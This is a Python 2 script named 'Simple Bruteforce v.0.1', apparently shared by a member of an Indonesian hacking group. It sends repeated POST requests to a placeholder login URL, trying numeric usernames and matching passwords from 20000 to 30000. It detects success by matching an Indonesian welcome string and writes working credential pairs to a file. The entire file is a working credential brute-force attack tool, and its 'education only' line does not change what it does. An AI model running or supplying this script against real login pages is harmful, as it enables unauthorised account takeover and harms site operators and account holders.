#!/usr/bin/env python
# Name : Simple Bruteforce v.0.1
# Author: mirfansulaiman
# Indonesian Backtrack Team | Kurawa In Disorder 
# http://indonesianbacktrack.or.id
# http://mirfansulaiman.com/
# http://ctfs.me/
#
# have a bug? report to doctorgombal@gmail.com or PM at http://indonesianbacktrack.or.id/forum/user-10440.html
#
# Note : This tool for education only. 
# Dont change author name !
import requests
import re
from random import randint, choice
from string import ascii_uppercase
import string, sys, os, time
RED = "\033[1;31;40m"
WHITE = "\033[1;37;40m"
GREEN = "\033[1;32;40m"
CYAN = "\033[1;36;40m"
PURPLE = "\033[1;35;40m"
TAG = "\033[0m"

def main():
    count = 0
    No = 20000
    a = 30000
    while No <= a:
        url = "http://target.com"
        Username = No
        Password = No
        payload = {
                  "login":"login",
                  "password":Password,
                  "username":Username,
                }
        headers = {}
        timeout = 15
        response = requests.request("POST", url, data=payload, headers=headers)
        time.sleep(0.5)
        count = count + 1
        No = No + 1
        print "------------------------------------"
        print "{0}NO{1} : {2} | {3}[BRUTEFORCE]{4}".format(WHITE, TAG, count, RED, TAG)
        print "{0}SEND{1} : {2}{3}{4} | {5}{6}{7} ".format(WHITE, TAG, CYAN, Username, TAG, PURPLE, Password, TAG)
        gagal = re.search('Login ke Akun Anda', response.text)
        result = re.search('Selamat Datang', response.text)
        if result:
               print "{0}STATUS{1} : {2}LOGIN SUCCESS{3}".format(WHITE,TAG,GREEN,TAG)
               f = open("result2.txt", "a")
               f.write("{0}:{1}\n".format(Username,Password))
               f.close()
        elif gagal:
               print "{0}STATUS{1} : {2}LOGIN FAIL{3}".format(WHITE,TAG,RED,TAG)
       
if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print ' [Exit]'
        try:
            sys.exit(0)
        except SystemExit:
            os._exit(0)